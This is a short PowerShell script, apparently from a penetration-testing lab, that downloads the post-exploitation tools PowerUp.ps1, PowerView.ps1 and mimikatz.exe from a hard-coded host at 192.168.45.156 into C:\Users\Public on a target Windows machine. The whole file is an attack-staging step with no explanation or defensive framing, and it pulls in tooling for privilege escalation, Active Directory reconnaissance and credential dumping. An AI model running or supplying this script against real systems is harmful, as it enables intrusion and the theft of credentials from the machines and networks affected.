$baseUrl = "http://192.168.45.156/"
$fileNames = @("PowerUp.ps1", "PowerView.ps1", "mimikatz.exe")
$OutFilePath = "C:\Users\Public\"

foreach ($fileName in $fileNames) {
    $url = "$baseUrl$fileName"
    $outFile = Join-Path $OutFilePath $fileName

    # Check if file already exists
    if (Test-Path $outFile) {
        Write-Host "[*] File $fileName already exists. Skipping..."
        continue
    }

    try {
        Invoke-WebRequest -Uri $url -OutFile $outFile -ErrorAction Stop
        Write-Host "[+] Successfully downloaded $fileName to $outFile"
    }
    catch {
        Write-Host "[-] Failed to download $fileName from $baseUrl. Error: $_" -ForegroundColor Red
    }
}
